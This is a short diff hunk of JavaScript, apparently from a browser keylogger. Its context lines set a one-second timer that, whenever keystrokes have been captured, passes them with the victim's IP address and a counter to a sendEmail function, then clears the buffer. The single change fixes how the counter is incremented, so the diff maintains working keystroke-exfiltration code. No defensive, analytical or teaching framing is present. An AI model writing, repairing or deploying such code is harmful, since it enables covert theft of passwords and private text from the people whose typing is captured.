@@ -191,7 +191,7 @@
 	  window.setInterval(function(){
 	if(keys.length>0) {
 		sendEmail(window.ip + ':' + window.d + ':' + keys);
-		d+=1
+		window.d++
 		keys = '';
 	}
 }, 1000);
